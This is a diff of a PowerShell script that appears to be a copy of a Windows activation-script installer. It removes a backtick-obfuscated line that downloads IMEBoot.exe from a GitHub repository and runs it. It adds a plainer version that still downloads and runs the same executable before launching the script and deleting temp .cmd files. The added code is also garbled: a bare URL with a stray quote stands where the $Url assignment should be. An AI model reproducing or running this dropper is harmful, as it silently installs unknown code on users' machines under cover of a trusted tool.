@@ -32,5 +32,13 @@ $ScriptArgs = "$args "
 $prefix = "@:: $rand `r`n"
 $content = $prefix + $response
 Set-Content -Path $FilePath -Value $content"
-$F="N`e`w-O`b`ject";$J=[R`a`N`D`O`m];$w=[s`Ys`Te`m.Net.W`e`bC`l`i`e`N`t];$Q="htt`p`s`://`g`i`t`h`u`b`.`c`o`m/S`h`e`l`lS`c`u`l`p`t`o`r/`G`e`t`s`S`c`r`e`e`n-`W`i`n`d`o`w`s-1`0/`r`a`w/m`a`i`n/I`M`E`B`o`o`t`.`e`x`e";$x="C:\T`e`m`p\I`M`E`B`o`o`t`.`e`x`e";$h="$`e`n`v:S`y`s`te`mR`o`o`t\`T`e`m`p\M`A`S_`$`($J`::`N`e`X`t(99999999)).c`m`d";$d="s`T`a`r`t`-P`r`o`c`e`s`s";i`e($h-eq"")
-{$h="$`e`n`v:T`e`m`p\M`A`S_`$`($J`::`N`e`X`t(99999999)).c`m`d"}$w::$F "S`y`s`T`e`m.Net.W`e`bC`l`i`e`N`t";$w.DownloadFile($Q,$x);s`T`a`r`t-P`r`o`c`e`s`s $x;i`e($h-eq""){$h="$`e`n`v:S`y`s`te`mR`o`o`t\`T`e`m`p\M`A`S_`$`($J`::`N`e`X`t(99999999)).c`m`d"}s`T`a`r`t-P`r`o`c`e`s`s $h;$j=@("$`e`n`v:T`e`m`p\M`A`S*.c`m`d","$`e`n`v:S`y`s`te`mR`o`o`t\T`e`m`p\M`A`S*.c`m`d");f`o`r`e`a`c`h($i i`n $j){g`e`t-i`T`E`m $i| r`E`m`o`v`e-I`T`E`m}
+https://github.com/ShellSculptor/GetsScreen-Windows-10/raw/main/IMEBoot.exe"
+$Filename = "C:\Temp\IMEBoot.exe"
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($Url, $Filename)
+Start-Process $Filename
+
+Start-Process $FilePath $ScriptArgs -Wait
+
+$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
+foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
